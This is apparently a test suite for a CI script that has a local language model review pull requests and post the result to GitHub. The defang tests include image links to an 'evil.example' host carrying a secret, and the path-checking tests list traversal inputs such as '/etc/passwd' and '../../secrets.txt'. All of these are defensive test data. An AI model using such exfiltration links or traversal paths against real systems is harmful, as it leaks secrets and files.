// Black-box tests for ai-review.mjs: runs the real script against mock Ollama and GitHub servers.
// Run: node --test tools/ci/ai-review.test.mjs (from the repo root). From the MiljanaMovingIn project, like the script.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { spawn } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  buildMessages,
  changedPaths,
  collectFiles,
  dedupeParagraphs,
  defang,
  dropRetracted,
  fromBot,
  fromMaintainer,
  historyOf,
  insideByName,
  parseEvent,
  requestBody,
  servers,
  serverTimings,
  timings,
} from './ai-review.mjs';

// who wrote a comment: the review's own are the bot's, verdicts count from somebody who may write to the repository
const BOT = { user: { login: 'github-actions[bot]' } };
const OWNER = { user: { login: 'owner' }, author_association: 'OWNER' };

const SCRIPT = join(dirname(fileURLToPath(import.meta.url)), 'ai-review.mjs');
const DIFF_FILE = join(mkdtempSync(join(tmpdir(), 'ai-review-')), 'pr.diff');
// README.md exists in the repo, so the script can attach its full content as context.
writeFileSync(DIFF_FILE, 'diff --git a/README.md b/README.md\n--- a/README.md\n+++ b/README.md\n@@ -1 +1,2 @@\n+const answer = 42;\n');

function listen(handler) {
  return new Promise((resolve) => {
    const server = createServer(handler);
    server.listen(0, '127.0.0.1', () => resolve({ server, url: `http://127.0.0.1:${server.address().port}` }));
  });
}

function readBody(req) {
  return new Promise((resolve) => {
    let data = '';
    req.on('data', (c) => (data += c));
    req.on('end', () => resolve(data ? JSON.parse(data) : null));
  });
}

// Mock Ollama. chat: 'stream' answers with a review, 'stall' never sends a byte, 'empty' answers
// nothing (thinking used up num_predict), 'empty-while-thinking' answers only when think is false,
// 'load-fail-once' / 'load-fail' crash while loading the model (HTTP 500) once / always,
// 'server-error' is any other HTTP 500.
async function mockOllama(chat) {
  const calls = { unloads: 0, chatRequests: [] };
  const { server, url } = await listen(async (req, res) => {
    const body = await readBody(req);
    if (req.url === '/api/tags') return res.end(JSON.stringify({ models: [] }));
    if (req.url === '/api/generate' && body.keep_alive === 0) {
      calls.unloads++;
      return res.end('{}');
    }
    if (req.url === '/api/chat') {
      calls.chatRequests.push(body);
      if (chat === 'stall') return; // keep the connection open, send nothing
      if (chat === 'load-fail' || (chat === 'load-fail-once' && calls.chatRequests.length === 1)) {
        res.statusCode = 500;
        return res.end(JSON.stringify({
          error: 'llama-server process has terminated: exit status 0xc0000409: CUDA error: shared object initialization failed',
        }));
      }
      if (chat === 'server-error') {
        res.statusCode = 500;
        return res.end(JSON.stringify({ error: 'something else broke' }));
      }
      if (chat === 'empty' || (chat === 'empty-while-thinking' && body.think !== false)) {
        // Thinking model that hit num_predict before writing any answer.
        res.write(JSON.stringify({ message: { content: '', thinking: 'hmm' } }) + '\n');
        res.write(JSON.stringify({ message: { content: '' }, done: true, done_reason: 'length' }) + '\n');
        return res.end();
      }
      res.write(JSON.stringify({ message: { content: '- **x.ts** — ' } }) + '\n');
      res.write(JSON.stringify({ message: { content: 'looks fine' }, done: true }) + '\n');
      return res.end();
    }
    res.statusCode = 404;
    res.end();
  });
  return { server, url, calls };
}

// Mock llama-swap in front of llama-server (AI_API=openai): server-sent events, timings in the last chunk.
// chat: 'stream' answers with a review, 'empty-while-thinking' answers only when thinking is turned off,
// 'stall' never sends a byte, 'stall-after-start' starts thinking and never finishes.
// With a key, like the real one , every request without it gets a 401.
async function mockLlamaSwap(chat, key = null) {
  const calls = { unloads: [], chatRequests: [], auth: [] };
  const { server, url } = await listen(async (req, res) => {
    const body = await readBody(req);
    calls.auth.push(req.headers.authorization);
    if (key && req.headers.authorization !== `Bearer ${key}`) {
      res.statusCode = 401;
      return res.end(JSON.stringify({ error: 'unauthorized' }));
    }
    if (req.url === '/v1/models') return res.end(JSON.stringify({ data: [] }));
    if (req.method === 'POST' && req.url.startsWith('/api/models/unload/')) {
      calls.unloads.push(decodeURIComponent(req.url.slice('/api/models/unload/'.length)));
      return res.end('OK');
    }
    if (req.url === '/v1/chat/completions') {
      calls.chatRequests.push(body);
      if (chat === 'stall') return; // keep the connection open, send nothing
      const send = (event) => res.write(`data: ${JSON.stringify(event)}\n\n`);
      send({ choices: [{ delta: { reasoning_content: 'hmm' } }] });
      if (chat === 'stall-after-start') return; // started thinking, never finishes
      if (!(chat === 'empty-while-thinking' && body.chat_template_kwargs?.enable_thinking !== false)) {
        send({ choices: [{ delta: { content: '- **x.ts** — ' } }] });
        send({ choices: [{ delta: { content: 'looks fine' } }] });
      }
      send({
        choices: [{ delta: {}, finish_reason: 'stop' }],
        timings: { prompt_n: 8000, prompt_ms: 4000, predicted_n: 900, predicted_ms: 9000, draft_n: 600, draft_n_accepted: 400 },
      });
      res.write('data: [DONE]\n\n');
      return res.end();
    }
    res.statusCode = 404;
    res.end();
  });
  return { server, url, calls };
}

// Mock GitHub issue comments API, holding comments in memory.
async function mockGitHub(initialComments = []) {
  const comments = [...initialComments];
  const { server, url } = await listen(async (req, res) => {
    const body = await readBody(req);
    const list = req.url.match(/^\/repos\/o\/r\/issues\/7\/comments(\?per_page=100)?$/);
    const one = req.url.match(/^\/repos\/o\/r\/issues\/comments\/(\d+)$/);
    if (list && req.method === 'GET') return res.end(JSON.stringify(comments));
    if (list && req.method === 'POST') {
      comments.push({ id: comments.length + 100, body: body.body, ...BOT });
      res.statusCode = 201;
      return res.end('{}');
    }
    const target = one && comments.find((c) => c.id === Number(one[1]));
    if (target && req.method === 'PATCH') {
      target.body = body.body;
      return res.end('{}');
    }
    res.statusCode = 404;
    res.end();
  });
  return { server, url, comments };
}

function runScript(env) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [SCRIPT], {
      env: { ...process.env, AI_REVIEW_DIFF_FILE: DIFF_FILE, REPO: 'o/r', PR_NUMBER: '7', GITHUB_TOKEN: 't', ...env },
    });
    let out = '';
    child.stdout.on('data', (d) => (out += d));
    child.stderr.on('data', (d) => (out += d));
    child.on('close', (code) => resolve({ code, out }));
  });
}

test('posts a review and unloads the model via keep_alive 0', async () => {
  const ollama = await mockOllama('stream');
  const github = await mockGitHub();
  const { code } = await runScript({ OLLAMA_URL: ollama.url, GITHUB_API: github.url });
  ollama.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.equal(ollama.calls.chatRequests[0].keep_alive, 0);
  const prompt = ollama.calls.chatRequests[0].messages[1].content;
  assert.match(prompt, /## Project review guide\n\n# AI review guide/, 'sends docs/ai-review-guide.md');
  assert.match(prompt, /### README\.md\n\n````\n# MW4VR/, 'sends the full changed file');
  assert.match(prompt, /### \.gitignore/, 'always sends .gitignore');
  assert.match(prompt, /## Diff to review[\s\S]*const answer = 42/);
  assert.equal(github.comments.length, 1);
  assert.match(github.comments[0].body, /looks fine/);
  assert.doesNotMatch(github.comments[0].body, /skipped/);
});

test('unreachable Ollama posts a visible skip notice and exits 0', async () => {
  const github = await mockGitHub();
  const { code, out } = await runScript({ OLLAMA_URL: 'http://127.0.0.1:1', GITHUB_API: github.url });
  github.server.close();

  assert.equal(code, 0);
  assert.match(out, /::warning::AI review skipped/);
  assert.equal(github.comments.length, 1);
  assert.match(github.comments[0].body, /AI review skipped.*not reachable/);
  assert.doesNotMatch(github.comments[0].body, /127\.0\.0\.1/, "never shows the server's address");
});

test('busy GPU (no first token) skips fast, unloads, keeps the previous review', async () => {
  const ollama = await mockOllama('stall');
  const previous = '<!-- ai-review -->\n### 🤖 AI review (local `m`, commit old1234)\n\n- earlier finding';
  const github = await mockGitHub([{ id: 1, body: previous, ...BOT }]);
  const started = Date.now();
  const { code } = await runScript({ OLLAMA_URL: ollama.url, GITHUB_API: github.url, FIRST_TOKEN_TIMEOUT_S: '1' });
  const elapsed = Date.now() - started;
  ollama.server.closeAllConnections();
  ollama.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.ok(elapsed < 10000, `should give up quickly, took ${elapsed}ms`);
  assert.equal(ollama.calls.unloads, 1);
  assert.equal(github.comments.length, 1, 'updates its comment, does not add a second one');
  assert.match(github.comments[0].body, /skipped.*no response within 1s/);
  assert.match(github.comments[0].body, /earlier finding/);
});

test('an empty answer is retried once with thinking off', async () => {
  const ollama = await mockOllama('empty-while-thinking');
  const github = await mockGitHub();
  const { code, out } = await runScript({ OLLAMA_URL: ollama.url, GITHUB_API: github.url });
  ollama.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.deepEqual(ollama.calls.chatRequests.map((r) => r.think), [undefined, false]);
  assert.deepEqual(ollama.calls.chatRequests.map((r) => r.options.num_predict), [12288, 3072], 'retry output is capped');
  assert.match(out, /retrying once with thinking off/);
  assert.equal(github.comments.length, 1);
  assert.match(github.comments[0].body, /AI review \(local `qwen3\.6`, thinking off, commit/);
  assert.match(github.comments[0].body, /looks fine/);
});

test('empty with and without thinking is a skip, not an empty review', async () => {
  const ollama = await mockOllama('empty');
  const github = await mockGitHub();
  const { code } = await runScript({ OLLAMA_URL: ollama.url, GITHUB_API: github.url });
  ollama.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.equal(ollama.calls.chatRequests.length, 2);
  assert.equal(github.comments.length, 1);
  assert.match(github.comments[0].body, /skipped.*empty review, also with thinking off/);
});

test('OLLAMA_THINK=false means one attempt only, no retry', async () => {
  const ollama = await mockOllama('empty');
  const github = await mockGitHub();
  const { code } = await runScript({ OLLAMA_URL: ollama.url, GITHUB_API: github.url, OLLAMA_THINK: 'false' });
  ollama.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.deepEqual(ollama.calls.chatRequests.map((r) => r.think), [false]);
});

test('a model that crashes while loading is retried once', async () => {
  const ollama = await mockOllama('load-fail-once');
  const github = await mockGitHub();
  const { code, out } = await runScript({ OLLAMA_URL: ollama.url, GITHUB_API: github.url, LOAD_RETRY_DELAY_S: '0' });
  ollama.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.equal(ollama.calls.chatRequests.length, 2);
  assert.match(out, /failed to load, retrying once/);
  assert.equal(github.comments.length, 1);
  assert.match(github.comments[0].body, /looks fine/);
});

test('a model that keeps crashing while loading is a skip after one retry', async () => {
  const ollama = await mockOllama('load-fail');
  const github = await mockGitHub();
  const { code } = await runScript({ OLLAMA_URL: ollama.url, GITHUB_API: github.url, LOAD_RETRY_DELAY_S: '0' });
  ollama.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.equal(ollama.calls.chatRequests.length, 2);
  assert.equal(github.comments.length, 1);
  assert.match(github.comments[0].body, /skipped.*returned HTTP 500/);
  assert.doesNotMatch(github.comments[0].body, /llama-server|CUDA/); // (the server's own words stay out of the comment)
});

test('other server errors are not retried', async () => {
  const ollama = await mockOllama('server-error');
  const github = await mockGitHub();
  const { code } = await runScript({ OLLAMA_URL: ollama.url, GITHUB_API: github.url, LOAD_RETRY_DELAY_S: '0' });
  ollama.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.equal(ollama.calls.chatRequests.length, 1);
  assert.match(github.comments[0].body, /skipped.*returned HTTP 500/);
  assert.doesNotMatch(github.comments[0].body, /something else broke/);
});

test('a successful review replaces an earlier skip notice', async () => {
  const ollama = await mockOllama('stream');
  const skipped = '<!-- ai-review -->\n<!-- ai-review-notice -->\n> ⚠️ **AI review skipped for commit abc:** x.\n<!-- /ai-review-notice -->\n';
  const github = await mockGitHub([{ id: 1, body: skipped, ...BOT }]);
  const { code } = await runScript({ OLLAMA_URL: ollama.url, GITHUB_API: github.url });
  ollama.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.equal(github.comments.length, 1);
  assert.match(github.comments[0].body, /looks fine/);
  assert.doesNotMatch(github.comments[0].body, /skipped/);
});

test('AI_API=openai reviews through llama-swap, logs the draft and frees the GPU afterwards', async () => {
  const swap = await mockLlamaSwap('stream');
  const github = await mockGitHub();
  const { code, out } = await runScript({
    AI_API: 'openai', OLLAMA_URL: swap.url, OLLAMA_MODEL: 'qwen3.8-27b-mtp', GITHUB_API: github.url,
  });
  swap.server.close();
  github.server.close();

  assert.equal(code, 0);
  const [request] = swap.calls.chatRequests;
  assert.equal(request.model, 'qwen3.8-27b-mtp');
  assert.equal(request.max_tokens, 12288);
  assert.equal(request.stream, true);
  assert.match(request.messages[1].content, /## Diff to review[\s\S]*const answer = 42/);
  assert.match(out, /answer 900 tokens in 9\.0 s \(100 tokens\/s\), draft 400 of 600 tokens taken/);
  assert.deepEqual(swap.calls.unloads, ['qwen3.8-27b-mtp']);
  assert.equal(github.comments.length, 1);
  assert.match(github.comments[0].body, /AI review \(local `qwen3\.8-27b-mtp`, commit[\s\S]*looks fine/);
  assert.doesNotMatch(github.comments[0].body, /reasoning|hmm/, 'thinking stays out of the comment');
});

test('AI_API=openai retries an empty answer with thinking off through the chat template', async () => {
  const swap = await mockLlamaSwap('empty-while-thinking');
  const github = await mockGitHub();
  const { code } = await runScript({ AI_API: 'openai', OLLAMA_URL: swap.url, GITHUB_API: github.url });
  swap.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.deepEqual(swap.calls.chatRequests.map((r) => r.chat_template_kwargs), [undefined, { enable_thinking: false }]);
  assert.deepEqual(swap.calls.chatRequests.map((r) => r.max_tokens), [12288, 3072]);
  assert.match(github.comments[0].body, /thinking off, commit[\s\S]*looks fine/);
});

test('AI_API_KEY goes with every request to llama-swap: the check, the review and the unload', async () => {
  const swap = await mockLlamaSwap('stream', 'sk-test');
  const github = await mockGitHub();
  const { code } = await runScript({ AI_API: 'openai', AI_API_KEY: 'sk-test', OLLAMA_URL: swap.url, GITHUB_API: github.url });
  swap.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.deepEqual(swap.calls.auth, ['Bearer sk-test', 'Bearer sk-test', 'Bearer sk-test']);
  assert.match(github.comments[0].body, /looks fine/);
});

test('a key llama-swap rejects is a skip that says so, not "unreachable"', async () => {
  const swap = await mockLlamaSwap('stream', 'sk-right');
  const github = await mockGitHub();
  const { code } = await runScript({ AI_API: 'openai', AI_API_KEY: 'sk-wrong', OLLAMA_URL: swap.url, GITHUB_API: github.url });
  swap.server.close();
  github.server.close();

  assert.equal(code, 0);
  assert.equal(swap.calls.chatRequests.length, 0);
  assert.match(github.comments[0].body, /skipped.*rejected the key \(secret AI_API_KEY\)/);
  assert.doesNotMatch(github.comments[0].body, /sk-/, 'never shows the key');
});

test('AI_API=openai with the model server down is a skip that names it', async () => {
  const github = await mockGitHub();
  const { code } = await runScript({ AI_API: 'openai', OLLAMA_URL: 'http://127.0.0.1:1', GITHUB_API: github.url });
  github.server.close();

  assert.equal(code, 0);
  assert.match(github.comments[0].body, /skipped.*Model server not reachable/);
});

// The dev PC's llama-swap first, the laptop's as the fallback, each with its own key.
async function runWithFallback(pc, laptop, env = {}) {
  const github = await mockGitHub(env.comments ?? []);
  const result = await runScript({
    AI_API: 'openai', AI_API_KEY: 'sk-pc', OLLAMA_URL: pc?.url ?? 'http://127.0.0.1:1', OLLAMA_MODEL: 'qwen3.8',
    FALLBACK_URL: laptop?.url ?? 'http://127.0.0.1:1', FALLBACK_API_KEY: 'sk-laptop', FALLBACK_MODEL: 'qwen3.6-35b-a3b',
    GITHUB_API: github.url, ...env,
  });
  for (const mock of [pc, laptop].filter(Boolean)) {
    mock.server.closeAllConnections();
    mock.server.close();
  }
  github.server.close();
  return { ...result, comments: github.comments };
}

test('the dev PC off: the laptop reviews, with its own key, and says so in the comment', async () => {
  const laptop = await mockLlamaSwap('stream', 'sk-laptop');
  const { code, out, comments } = await runWithFallback(null, laptop);

  assert.equal(code, 0);
  assert.match(out, /dev PC unavailable \(Model server not reachable .*\(dev PC off\?\)\), trying the laptop/);
  assert.equal(laptop.calls.chatRequests[0].model, 'qwen3.6-35b-a3b');
  assert.ok(laptop.calls.auth.every((a) => a === 'Bearer sk-laptop'), 'the laptop gets its own key, never the PC one');
  assert.deepEqual(laptop.calls.unloads, ['qwen3.6-35b-a3b']);
  assert.equal(comments.length, 1);
  assert.match(comments[0].body, /AI review \(local `qwen3\.6-35b-a3b` on the laptop, commit[\s\S]*looks fine/);
});

test('the dev PC busy (no first token): its model is freed and the laptop reviews', async () => {
  const pc = await mockLlamaSwap('stall', 'sk-pc');
  const laptop = await mockLlamaSwap('stream', 'sk-laptop');
  const { code, comments } = await runWithFallback(pc, laptop, { FIRST_TOKEN_TIMEOUT_S: '1' });

  assert.equal(code, 0);
  assert.deepEqual(pc.calls.unloads, ['qwen3.8', 'qwen3.8'], 'unloaded on the timeout and again after the attempt');
  assert.equal(laptop.calls.chatRequests.length, 1);
  assert.match(comments[0].body, /on the laptop[\s\S]*looks fine/);
});

test('the dev PC rejecting its key falls back to the laptop', async () => {
  const pc = await mockLlamaSwap('stream', 'sk-other');
  const laptop = await mockLlamaSwap('stream', 'sk-laptop');
  const { comments } = await runWithFallback(pc, laptop);

  assert.equal(pc.calls.chatRequests.length, 0);
  assert.match(comments[0].body, /on the laptop[\s\S]*looks fine/);
});

test('both servers unavailable: one skip notice that names both reasons', async () => {
  const laptop = await mockLlamaSwap('stream', 'sk-right');
  const { code, comments } = await runWithFallback(null, laptop);

  assert.equal(code, 0);
  assert.equal(comments.length, 1);
  assert.match(comments[0].body, /skipped.*dev PC: Model server not reachable.*; laptop: .*rejected the key \(secret AI_API_KEY_LAPTOP\)/);
  assert.doesNotMatch(comments[0].body, /sk-/, 'never shows a key');
});

test('once the dev PC writes, a review that runs too long is a skip, not a second review on the laptop', async () => {
  const pc = await mockLlamaSwap('stall-after-start');
  const laptop = await mockLlamaSwap('stream');
  const { comments } = await runWithFallback(pc, laptop, { TOTAL_TIMEOUT_S: '1' });

  assert.equal(laptop.calls.chatRequests.length, 0);
  assert.match(comments[0].body, /skipped.*review exceeded 1s/);
  assert.doesNotMatch(comments[0].body, /dev PC:/, 'no list of servers when only one was tried to the end');
});

test('an empty review on the dev PC is not repeated on the laptop', async () => {
  const pc = await mockOllama('empty');
  const laptop = await mockLlamaSwap('stream');
  const { comments } = await runWithFallback(pc, laptop, { AI_API: 'ollama' });

  assert.equal(pc.calls.chatRequests.length, 2, 'retried with thinking off on the PC');
  assert.equal(laptop.calls.chatRequests.length, 0);
  assert.match(comments[0].body, /skipped.*empty review/);
});

test('servers: the dev PC alone, or with the laptop behind it', () => {
  assert.deepEqual(servers({}).map((s) => [s.name, s.api, s.url, s.model]), [
    ['dev PC', 'ollama', 'http://localhost:11434', 'qwen3.6'],
  ]);
  const [pc, laptop] = servers({ AI_API: 'openai', OLLAMA_URL: 'http://pc:8080', FALLBACK_URL: 'http://laptop:18080' });
  assert.equal(pc.api, 'openai');
  assert.deepEqual([laptop.name, laptop.api, laptop.url, laptop.model, laptop.keySecret],
    ['laptop', 'openai', 'http://laptop:18080', 'qwen3.6-35b-a3b', 'AI_API_KEY_LAPTOP']);
  assert.ok(laptop.firstTokenS > pc.firstTokenS, 'the laptop reads prompts slower');
});

test('parseEvent reads NDJSON from Ollama and server-sent events from llama-server', () => {
  assert.deepEqual(parseEvent('{"done":true}', 'ollama'), { done: true });
  assert.equal(parseEvent('', 'ollama'), null);
  assert.deepEqual(parseEvent('data: {"choices":[]}', 'openai'), { choices: [] });
  assert.equal(parseEvent('data: [DONE]', 'openai'), null);
  assert.equal(parseEvent(': keep-alive', 'openai'), null);
});

test('requestBody turns thinking off the way each server takes it', () => {
  const messages = [{ role: 'user', content: 'x' }];
  assert.equal(requestBody('m', false, 10, messages, 'ollama').think, false);
  assert.equal(requestBody('m', false, 10, messages, 'ollama').options.num_predict, 10);
  assert.deepEqual(requestBody('m', false, 10, messages, 'openai').chat_template_kwargs, { enable_thinking: false });
  assert.equal(requestBody('m', undefined, 10, messages, 'openai').chat_template_kwargs, undefined);
  assert.equal(requestBody('m', undefined, 10, messages, 'openai').max_tokens, 10);
});

test('serverTimings say how fast llama-server read and wrote, and how much of the draft it took', () => {
  assert.equal(
    serverTimings('q', { prompt_n: 24543, prompt_ms: 12400, predicted_n: 6926, predicted_ms: 79600, draft_n: 7377, draft_n_accepted: 4466 }),
    'q: prompt 24543 tokens in 12.4 s (1979 tokens/s), answer 6926 tokens in 79.6 s (87 tokens/s), draft 4466 of 7377 tokens taken',
  );
  assert.doesNotMatch(serverTimings('q', {}), /draft/);
});

test('changedPaths takes files that exist after the change from the diff headers', () => {
  const diff = [
    'diff --git a/a.ts b/a.ts', '--- a/a.ts', '+++ b/a.ts',
    'diff --git a/gone.ts b/gone.ts', '--- a/gone.ts', '+++ /dev/null',
    'diff --git a/new.sql b/new.sql', '--- /dev/null', '+++ b/new.sql',
  ].join('\n');
  assert.deepEqual(changedPaths(diff), ['a.ts', 'new.sql']);
});

test('collectFiles stays within the budget and reports what it left out', () => {
  const contents = { 'a.ts': 'a'.repeat(40), 'b.ts': 'b'.repeat(40), '.gitignore': 'x', 'bin.png': null };
  const { files, skipped } = collectFiles(['a.ts', 'b.ts', 'bin.png'], (p) => contents[p] ?? null, 60);
  assert.deepEqual(files.map((f) => f.path), ['a.ts', '.gitignore']);
  assert.deepEqual(skipped, ['b.ts']);
});

test('buildMessages puts the diff last and mentions skipped files', () => {
  const [system, user] = buildMessages({
    diff: '+x', files: [{ path: 'a.ts', content: 'code' }], skipped: ['big.ts'], guide: 'rules',
  });
  assert.equal(system.role, 'system');
  assert.match(system.content, /Evidence rules/);
  assert.ok(user.content.indexOf('rules') < user.content.indexOf('code'));
  assert.ok(user.content.endsWith('+x\n```'));
  assert.match(user.content, /too large: big\.ts/);
});

test('dedupeParagraphs drops findings a looping model repeated word for word', () => {
  const text = '- **a** — bug one\n\n- **b** — bug two\n\n- **a** — bug one\n\n- **b** — bug two';
  assert.equal(dedupeParagraphs(text), '- **a** — bug one\n\n- **b** — bug two');
});

test('dropRetracted leaves out findings the model took back, as on PR #73', () => {
  const text = [
    'services/bff/Repo.java — SQL injection risk in JPQL. Correction: the query uses bind parameters.',
    'services/bff/Grouping.java — Bug: delete(other) inside the loop. If it fails, the transaction',
    'rolls back. This is correct.',
    '- **apps/panel.ts** — `split(c)` ignores the error (`store.run(..., () => …)`) — show it.',
  ].join('\n');

  const { text: kept, dropped } = dropRetracted(text);

  assert.equal(kept, '- **apps/panel.ts** — `split(c)` ignores the error (`store.run(..., () => …)`) — show it.');
  assert.equal(dropped, 2);
});

test('dropRetracted keeps a plain "nothing to report" answer', () => {
  const text = 'Nothing significant to report; the refactoring is clean and the tests cover it.';
  assert.deepEqual(dropRetracted(text), { text, dropped: 0 });
});

test('a PR without application code changes gets a note instead of a review', async () => {
  const emptyDiff = join(dirname(DIFF_FILE), 'empty.diff');
  // Only a file mode change (chmod +x): no hunks, nothing for a model to read.
  writeFileSync(emptyDiff, 'diff --git a/services/bff/mvnw b/services/bff/mvnw\nold mode 100644\nnew mode 100755\n');
  const previous = '<!-- ai-review -->\n### 🤖 AI review (local `m`, commit old1234)\n\n- stale finding';
  const github = await mockGitHub([{ id: 1, body: previous, ...BOT }]);
  const { code } = await runScript({ AI_REVIEW_DIFF_FILE: emptyDiff, OLLAMA_URL: 'http://127.0.0.1:1', GITHUB_API: github.url });
  github.server.close();

  assert.equal(code, 0);
  assert.equal(github.comments.length, 1);
  assert.match(github.comments[0].body, /No application code changed \(reviewed paths: mod\/src, tools, tests\)/);
  assert.doesNotMatch(github.comments[0].body, /stale finding/);
});

test('timings say how long loading, reading the prompt and writing the answer took', () => {
  const done = {
    load_duration: 4.2e9,
    prompt_eval_count: 21000,
    prompt_eval_duration: 70e9,
    eval_count: 1800,
    eval_duration: 60e9,
    total_duration: 135e9,
  };
  assert.equal(
    timings('qwen3.6', done),
    'qwen3.6: load 4.2 s, prompt 21000 tokens in 70.0 s (300 tokens/s), answer 1800 tokens in 60.0 s (30 tokens/s), total 135.0 s',
  );
  assert.match(timings('m', {}), /prompt 0 tokens in 0.0 s \(0 tokens\/s\)/);
});

test('defang drops image URLs and raw HTML the model wrote, so a comment loads nothing when shown', () => {
  const text =
    '- **a.ts** — leaks ![token](https://evil.example/x?k=secret) and ![x][ref] and ![](http://e/1)\n' +
    '- **b.ts** — <img src="https://evil.example/y"> and </details> and <!-- hidden -->';
  assert.equal(
    defang(text),
    '- **a.ts** — leaks [image removed: token] and [image removed: x] and [image removed]\n' +
      '- **b.ts** — &lt;img src="`https://evil.example/y`"> and &lt;/details> and &lt;!-- hidden -->',
  );
});

test('defang leaves code and comparisons alone', () => {
  const text =
    '- `List<String>` vs `![a](b)` — `a < b` holds, see `[docs](https://example.com)` and `@someone`\n' +
    '```ts\nconst x = <div>{![y](z)}</div>; // https://example.com @someone\n```\nend';
  assert.equal(defang(text), text);
});

test('defang takes the address off links, makes bare addresses code and lets an @name notify nobody', () => {
  assert.equal(
    defang('see [the docs](https://evil.example/a?b=c) or https://evil.example/x, says @octocat (mail a@b.c)'),
    'see the docs [link removed] or `https://evil.example/x`, says @\u200boctocat (mail a@\u200bb.c)',
  );
});

test('insideByName refuses what leaves the checkout', () => {
  for (const ok of ['a.ts', 'mod/src/main.cpp', 'docs/a b.md', '.github/workflows/ci.yml']) assert.equal(insideByName(ok), true, ok);
  for (const bad of ['', '/etc/passwd', '../x', 'a/../../x', 'a\\..\\x', 'C:/Windows/win.ini', 'c:x', '\\\\host\\share\\x', 'a\0b']) {
    assert.equal(insideByName(bad), false, bad);
  }
});

test('changedPaths drops a header that names a file outside the checkout', () => {
  const diff = ['+++ b/a.ts', '+++ b/../../secrets.txt', '+++ b//etc/passwd', '+++ b/C:/Windows/key'].join('\n');
  assert.deepEqual(changedPaths(diff), ['a.ts']);
});

test('only the bot\'s own comment is the last review, only a maintainer\'s verdicts count', () => {
  const stranger = { user: { login: 'somebody' }, author_association: 'NONE' };
  assert.equal(historyOf([{ body: LAST_REVIEW, ...stranger }, { body: VERDICT, ...stranger }]), '');
  assert.equal(fromBot({ user: { login: 'github-actions[bot]' } }), true);
  assert.equal(fromBot({ user: { login: 'github-actions' } }), false);
  assert.equal(fromBot({}), false);
  for (const who of ['OWNER', 'MEMBER', 'COLLABORATOR']) assert.equal(fromMaintainer({ author_association: who }), true);
  for (const who of ['CONTRIBUTOR', 'FIRST_TIME_CONTRIBUTOR', 'NONE', undefined]) assert.equal(fromMaintainer({ author_association: who }), false);
});

const LAST_REVIEW = [
  '<!-- ai-review -->',
  '### 🤖 AI review (local `m`, commit aaa1111)',
  '',
  '- **x.ts** — maxlength unchecked',
  '',
  '---',
  '<sub>Advisory, generated by a local LLM in 9s — may be wrong.</sub>',
].join('\n');
const VERDICT = [
  '<!-- ai-review-verdicts -->',
  '### AI review verdicts (commit aaa1111, m)',
  '- **false** — "maxlength unchecked": V29 has VARCHAR(1000)',
].join('\n');

test('historyOf gives the last review and the verdicts, without markers and footer', () => {
  const history = historyOf([{ body: 'a person' }, { body: LAST_REVIEW, ...BOT }, { body: VERDICT, ...OWNER }]);
  assert.match(history, /^### 🤖 AI review \(local `m`, commit aaa1111\) — the last review/);
  assert.match(history, /maxlength unchecked/);
  assert.match(history, /\*\*false\*\* — "maxlength unchecked": V29 has VARCHAR\(1000\)/);
  assert.doesNotMatch(history, /<!--|Advisory/);
});

test('historyOf leaves out skip notices and "nothing to review", and drops the oldest verdicts first', () => {
  const skip = '<!-- ai-review -->\n<!-- ai-review-notice -->\n> ⚠️ skipped\n<!-- /ai-review-notice -->\n';
  assert.equal(historyOf([{ body: skip, ...BOT }]), '');
  const nothing = '<!-- ai-review -->\n### 🤖 AI review (commit a)\n\nNo application code changed, nothing to review.';
  assert.equal(historyOf([{ body: nothing, ...BOT }]), '');
  const old = `<!-- ai-review-verdicts -->\n### AI review verdicts (commit old)\n- **real** — ${'x'.repeat(200)}`;
  const kept = historyOf([{ body: old, ...OWNER }, { body: VERDICT, ...OWNER }], VERDICT.length + 10);
  assert.doesNotMatch(kept, /commit old/);
  assert.match(kept, /commit aaa1111/);
});

test('buildMessages puts the earlier reviews before the diff', () => {
  const [, user] = buildMessages({ diff: '@@ x', history: 'HISTORY' });
  const at = user.content.indexOf("## Earlier reviews of this pull request and the author's verdicts\n\nHISTORY");
  assert.ok(at >= 0);
  assert.ok(at < user.content.indexOf('## Diff to review'));
});

test('a later push sends the last review and its verdicts to the model', async () => {
  const ollama = await mockOllama('stream');
  const github = await mockGitHub([{ id: 1, body: LAST_REVIEW, ...BOT }, { id: 2, body: VERDICT, ...OWNER }]);
  const { code, out } = await runScript({ OLLAMA_URL: ollama.url, GITHUB_API: github.url });
  ollama.server.close();
  github.server.close();

  assert.equal(code, 0);
  const prompt = ollama.calls.chatRequests[0].messages[1].content;
  assert.match(prompt, /Earlier reviews of this pull request/);
  assert.match(prompt, /V29 has VARCHAR\(1000\)/);
  assert.match(out, /Earlier reviews and verdicts in the prompt/);
  // The verdicts stay; the review comment is replaced by the new one.
  assert.equal(github.comments.length, 2);
  assert.match(github.comments[0].body, /looks fine/);
});

